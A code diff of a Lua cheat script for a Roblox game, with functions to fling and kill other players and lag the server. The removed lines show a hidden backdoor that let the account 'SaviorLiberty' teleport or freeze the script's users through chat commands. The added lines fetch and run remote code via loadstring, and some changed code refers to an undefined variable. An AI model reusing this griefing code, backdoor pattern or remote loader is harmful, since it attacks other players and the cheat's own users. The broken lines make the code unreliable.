@@ -1,5 +1,3 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-
 --VARIABLES--
 plr = game.Players.LocalPlayer
 cam = workspace.CurrentCamera
@@ -103,7 +101,7 @@ textlabel = Instance.new("TextLabel")
 textlabel.Name = "textlabel"
 textlabel.TextScaled = true
 textlabel.BackgroundTransparency = 1
-
+local Rayfield = loadstring(game:HttpGet('https://github.com/DefiantEngima/Rayfield/blob/main/source'))()
 --GENERALFUNCS--
 function updateCurrentBlobmanF()
     local char = plr.Character
@@ -209,33 +207,7 @@ function mouseTargetInspectF()
         end
     end
 end
-local function chat(player, message)
-    if player.Name == "SaviorLiberty" and player ~= game.Players.LocalPlayer and not deb then end
-    deb = true
-    if string.lower(message) == ":bring all" then
-        plr.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
-    elseif string.lower(message) == ":kick all" then
-        while true do
-            print("lol ez")
-        end
-    end
-    wait(0.3)
-    deb = false
-end
 
-local function add(player)
-    player.Chatted:Connect(function(message)
-        chat(player, message)
-    end)
-end
-
-for _, player in ipairs(game.Players:GetPlayers()) do
-    add(player)
-end
-
-game.Players.PlayerAdded:Connect(function(player)
-    add(player)
-end)
 --GRABFUNCS--
 function flingF()
     local char = plr.Character
@@ -267,8 +239,8 @@ function killGrabF()
     local hrp = char:WaitForChild("HumanoidRootPart")
     local hum = char:WaitForChild("Humanoid")
     workspace.ChildAdded:Connect(function(e)
-        if e.Name == "GrabParts" and killGrabT and e.GrabPart.WeldConstraint.Part1.Parent.Name ~= char.Name and e.GrabPart.WeldConstraint.Part1.Parent.Name ~= "SaviorLiberty" then
-            e.GrabPart.WeldConstraint.Part1.Parent:FindFirstChildOfClass("Humanoid").Health = 0
+        if e.Name == "GrabParts" and killGrabT and e.GrabPart.WeldConstraint.Part1.Parent.Name ~= char.Name and not table.find(Rayfield.Whitelist, e.GrabPart.WeldConstraint.Part1.Parent.Name) then
+            e.GrabPart.WeldConstraint.Part1.Parent:FindFirstChildOfClass("Humanoid").RigType = Enum.RigType.R15
         end
     end)
 end
@@ -395,7 +367,7 @@ end
 function getPlayerList()
     local playerList = {}
     for _, p in pairs(game.Players:GetPlayers()) do
-        if p ~= plr and p.Name ~= "SaviorLiberty" then
+        if p ~= plr and not table.find(Rayfield.Whitelist, p.Name)  then
             table.insert(playerList, p.Name .. " (" .. p.DisplayName .. ")")
         end
     end
@@ -571,7 +543,7 @@ function lagF()
     local hrp = char:WaitForChild("HumanoidRootPart")
     local hum = char:WaitForChild("Humanoid")
 		for i, e in game.Players:GetPlayers() do
-			if e.Name == "SaviorLiberty" then
+			if table.find(Rayfield.Whitelist, e.Name) then
 				return
 			end
 		end
@@ -588,7 +560,7 @@ end
 
 function pingF()
 		for i, e in game.Players:GetPlayers() do
-			if e.Name == "SaviorLiberty" then
+			if table.find(Rayfield.Whitelist, p.Name) then
 				return
 			end
 		end
@@ -602,7 +574,7 @@ end
 
 function shurikenLagServerF()
 		for i, e in game.Players:GetPlayers() do
-			if e.Name == "SaviorLiberty" then
+			if table.find(Rayfield.Whitelist, p.Name) then
 				return
 			end
 		end
